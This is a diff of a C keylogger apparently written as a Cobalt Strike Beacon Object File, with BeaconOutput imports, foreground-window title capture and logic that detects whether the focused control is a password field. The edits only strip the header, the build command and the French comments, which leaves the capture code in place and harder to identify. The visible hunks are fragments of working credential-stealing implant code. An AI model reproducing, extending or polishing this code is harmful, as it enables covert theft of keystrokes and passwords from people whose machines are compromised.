@@ -1,6 +1,3 @@
-// keylog.c — poller, password detection, display propre
-// build: x86_64-w64-mingw32-gcc -c keylog.c -o keylog.o -O0 -Wall -D_WIN32_WINNT=0x0601
-
 #include <windows.h>
 DECLSPEC_IMPORT void __cdecl BeaconOutput(int type, const char* data, int len);
 #define CALLBACK_OUTPUT 0x0
@@ -159,7 +156,7 @@ static void capture_context(void) {
     HWND hwndFg = f_GetForegroundWindow();
     if (!hwndFg) return;
 
-    // fenêtre au premier plan
+    
     if (hwndFg != g_last_hwnd) {
         g_last_hwnd = hwndFg;
         char title[256] = {0};
@@ -169,7 +166,7 @@ static void capture_context(void) {
         if (n > 0) { flush_buf(); append(hdr, n); }
     }
 
-    // contrôle qui a le focus → champ mot de passe ?
+    // password ?
     GUITHREADINFO gti = {0};
     gti.cbSize = sizeof(gti);
     DWORD tid = f_GetWindowThreadProcessId(hwndFg, NULL);
